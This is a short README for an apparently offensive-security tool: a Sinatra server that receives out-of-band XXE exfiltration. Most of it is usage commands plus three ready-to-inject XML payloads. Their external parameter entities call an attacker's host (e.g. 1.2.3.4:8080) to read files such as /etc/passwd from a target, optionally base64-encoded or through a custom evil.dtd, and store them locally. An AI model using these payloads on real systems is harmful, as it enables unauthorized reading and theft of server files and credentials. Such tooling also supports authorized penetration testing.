# Simple XXE Out of Band (OOB) server

A simple Sinatra app for the XXE Out of Band technique.

## Usage

Start on default port of 8080:

```
./simpleXXE
```

Start on specified port (may need sudo in some cases):

```
sudo ./simpleXXE 80
```

Inject something like the following:

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
  <!ENTITY % fetch SYSTEM "http://HOST:PORT/xml?f=FULLPATH">
  %fetch;
  %load;
  %run;
]>
```

Where `HOST` and `PORT` are the hostname/IP and port of your XXE OOB
server. `FULLPATH` needs to be set to the full absolute path of the
file to be read file (e.g. f=/etc/passwd).

e.g. `http://1.2.3.4:8080/xml?f=/etc/passwd`

The file specified by `FULLPATH` will be stored under `./files`.
Depending on the targeted parser it may not work with all files. To
encode with base64, use something like the following:

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
  <!ENTITY % fetch SYSTEM "http://HOST:PORT/xmlb?f=FULLPATH">
  %fetch;
  %load;
  %run;
]>
```

To instead use your own dtd file, create an `dtd/evil.dtd` file and
use something like the following:

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
  <!ENTITY % fetch SYSTEM "http://HOST:PORT/dtd?d=evil">
  ...
]>
```
